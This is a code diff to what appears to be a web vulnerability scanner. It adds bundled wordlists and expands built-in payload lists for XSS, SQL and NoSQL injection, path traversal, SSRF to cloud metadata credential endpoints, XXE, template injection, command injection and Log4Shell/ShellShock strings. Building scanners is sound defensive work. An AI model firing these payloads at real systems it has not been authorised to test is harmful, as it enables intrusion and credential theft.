@@ -126,6 +126,22 @@ _DEFAULTS = {
         "sqli": ["sqli.txt", "sqli/*.txt"],
         "rce": ["rce.txt", "rce/*.txt", "cmdi.txt", "cmdi/*.txt"],
     },
+    # Bundled high-quality wordlists (always available, no external dependency)
+    "bundled": {
+        "root": _PKG_ROOT / "websecure" / "wordlists",
+        "git": None,
+        "xss": ["xss.txt"],
+        "sqli": ["sqli.txt"],
+        "lfi": ["lfi.txt"],
+        "path_traversal": ["lfi.txt"],
+        "ssrf": ["ssrf.txt"],
+        "xxe": ["xxe.txt"],
+        "ssti": ["ssti.txt"],
+        "nosqli": ["nosqli.txt"],
+        "cmdi": ["cmdi.txt"],
+        "rce": ["cmdi.txt"],
+        "open_redirect": ["open_redirect.txt"],
+    },
 }
 
 def _provider_roots(cfg_section: dict) -> dict:
@@ -301,22 +317,23 @@ def _provider_roots(cfg_section: dict) -> dict:
     out = {}
     alias_map = {'custom': 'wordlists_custom'}
     if isinstance(cfg_section, dict):
-        for a,b in alias_map.items():
+        for a, b in alias_map.items():
             if a in cfg_section and b not in cfg_section:
                 cfg_section[b] = cfg_section[a]
-    for prov in ["seclists", "pattt", "wordlists_custom"]:
+    for prov in ["bundled", "seclists", "pattt", "wordlists_custom"]:
+        defaults = _DEFAULTS.get(prov, {})
         sec = cfg_section.get(prov, {}) if isinstance(cfg_section, dict) else {}
-        root = Path(sec.get("root") or _DEFAULTS[prov]["root"])
-        out[prov] = {
+        root = Path(sec.get("root") or defaults.get("root") or _PKG_ROOT / "wordlists")
+        entry: dict = {
             "root": root,
-            "git": sec.get("git", _DEFAULTS[prov]["git"]),
-            "xss": sec.get("xss") or _DEFAULTS[prov]["xss"],
-            "sqli": sec.get("sqli") or _DEFAULTS[prov]["sqli"],
-            "nosqli": sec.get("nosqli") or _DEFAULTS[prov].get("nosqli"),
-            "rce": sec.get("rce") or _DEFAULTS[prov]["rce"],
-            "jwt_secrets": sec.get("jwt_secrets") or _DEFAULTS[prov].get("jwt_secrets"),
-            "graphql": sec.get("graphql") or _DEFAULTS[prov].get("graphql"),
+            "git": sec.get("git", defaults.get("git")),
         }
+        # Copy all category keys from defaults, allowing config overrides
+        for key, default_val in defaults.items():
+            if key in ("root", "git"):
+                continue
+            entry[key] = sec.get(key) or default_val
+        out[prov] = entry
     return out
 
 def load_external_payloads(category: str, marker: str | None = None) -> list[str]:
@@ -332,8 +349,8 @@ def load_external_payloads(category: str, marker: str | None = None) -> list[str
     if pl_cfg is False or not isinstance(pl_cfg, dict):
         return []
 
-    # enabled providers order
-    providers = pl_cfg.get("providers") or ["seclists", "pattt", "wordlists_custom"]
+    # enabled providers order — bundled first (always available), then external, then custom
+    providers = pl_cfg.get("providers") or ["bundled", "seclists", "pattt", "wordlists_custom"]
     if isinstance(providers, dict):
         providers = list(providers.keys())
 
@@ -344,11 +361,11 @@ def load_external_payloads(category: str, marker: str | None = None) -> list[str
         q = prov_map.get(p, p)
         if not q:
             continue
-        if q in ("wordlists_custom", "seclists", "pattt") and q not in seen:
+        if q in ("bundled", "wordlists_custom", "seclists", "pattt") and q not in seen:
             norm.append(q)
             seen.add(q)
-    if "wordlists_custom" not in seen:
-        norm = ["wordlists_custom"] + norm
+    if "bundled" not in seen:
+        norm = ["bundled"] + norm
     providers = norm
 
     roots = _provider_roots(pl_cfg)
@@ -511,34 +528,122 @@ BUILTIN_PAYLOADS = {
         "\"><script>alert(1)</script>",
         "1;SLEEP(5)#",
         "1 OR 1=1",
-        "\"-prompt(8)-\"",
-        "'-prompt(8)-'",
         ";|/usr/bin/id|",
         "{{7*7}}",
         "${7*7}",
         "foo\" onmouseover=\"alert(1)",
-   ],
-   "xss_advanced": [
-       "<svg/onload=alert(1)>",
-       "<iframe/src=javascript:alert(1)>",
-       "<x onfocus=alert(1) autofocus>",
-       "<img src=x onerror=alert(1)>",
-       "\"><svg/onload=confim(1)>",
-       "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-   ],
-   "exploit": [
-       "${jndi:ldap://127.0.0.1:1389/a}", # Log4Shell
-       "${jndi:dns://127.0.0.1:53/a}",
-       "{{7*7}}",
-       "${7*7}",
-       "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di if(%22j%22.equals(%22j%22))...", # Spring4Shell partial
-       "() { :;}; /bin/bash -c 'cat /etc/passwd'", # ShellShock
-       "() { :;}; /bin/echo 'ShellShock'",
-       "pkexec --version",
-       "/bin/sh -c 'id'",
-       "cat /etc/passwd",
-       "root:x:0:0",
-   ]
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//",
+    ],
+    "xss": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "'><script>alert(1)</script>",
+        "<svg/onload=alert(1)>",
+        "<img src=x onerror=alert(1)>",
+        "<iframe/src=javascript:alert(1)>",
+        "<x onfocus=alert(1) autofocus>",
+        "<details open ontoggle=alert(1)>",
+        "<video src=x onerror=alert(1)>",
+        "\" onmouseover=\"alert(1)",
+        "' onmouseover='alert(1)",
+        ";alert(1);//",
+        "';alert(1);//",
+        "javascript:alert(1)",
+        "javascript:alert(document.domain)",
+        "{{constructor.constructor('alert(1)')()}}",
+    ],
+    "sqli": [
+        "'",
+        "\"",
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "\" OR 1=1--",
+        "' AND SLEEP(5)--",
+        "'; WAITFOR DELAY '0:0:5'--",
+        "' AND (SELECT 1 FROM pg_sleep(5))--",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' ORDER BY 1--",
+        "' ORDER BY 10--",
+    ],
+    "lfi": [
+        "../etc/passwd",
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../etc/passwd",
+        "..%2Fetc%2Fpasswd",
+        "%2e%2e%2fetc%2fpasswd",
+        "php://filter/read=convert.base64-encode/resource=index.php",
+        "php://input",
+        "/etc/passwd",
+        "C:\\windows\\win.ini",
+        "file:///etc/passwd",
+    ],
+    "ssrf": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://127.0.0.1/",
+        "http://localhost/",
+        "http://0.0.0.0/",
+        "http://[::1]/",
+        "file:///etc/passwd",
+        "dict://127.0.0.1:6379/info",
+        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
+    ],
+    "xxe": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>",
+    ],
+    "ssti": [
+        "{{7*7}}",
+        "${7*7}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{%import os%}${os.popen('id').read()}",
+        "#set($x=7*7)${x}",
+        "<%= `id` %>",
+    ],
+    "nosqli": [
+        "[$ne]=1",
+        "[$gt]=",
+        "[$regex]=.*",
+        "{\"$ne\": null}",
+        "{\"$regex\": \".*\"}",
+        "{\"$where\": \"1==1\"}",
+        "' && '1'=='1",
+        "' || '1'=='1",
+        "'; return true; //",
+    ],
+    "cmdi": [
+        "; id",
+        "| id",
+        "|| id",
+        "& id",
+        "&& id",
+        "`id`",
+        "$(id)",
+        "; cat /etc/passwd",
+        "& whoami",
+        "; sleep 5",
+        "& timeout /T 5 /NOBREAK",
+        "%0a id",
+        "| sleep 5",
+    ],
+    "exploit": [
+        "${jndi:ldap://127.0.0.1:1389/a}",
+        "${jndi:dns://127.0.0.1:53/a}",
+        "${jndi:ldap://127.0.0.1:1389/exploit}",
+        "() { :;}; /bin/bash -c 'cat /etc/passwd'",
+        "() { :;}; /bin/echo 'ShellShock'",
+    ],
 }
 
 def get_builtin_payloads(category: str) -> List[str]:
